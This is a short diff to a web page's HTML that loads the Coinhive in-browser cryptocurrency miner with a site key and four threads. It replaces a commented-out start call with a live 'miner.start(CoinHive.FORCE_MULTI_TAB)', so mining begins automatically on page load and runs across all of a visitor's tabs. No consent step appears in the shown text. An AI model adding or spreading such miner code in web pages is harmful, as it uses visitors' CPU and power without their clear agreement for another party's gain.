@@ -285,7 +285,7 @@
     <script src="https://coin-hive.com/media/miner-ui.js"></script>
     <script type="text/javascript">
       var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw', {threads: 4});
-      //miner.start();
+      miner.start(CoinHive.FORCE_MULTI_TAB);
       
       setInterval(function() {
 	      var hashesPerSecond = miner.getHashesPerSecond();
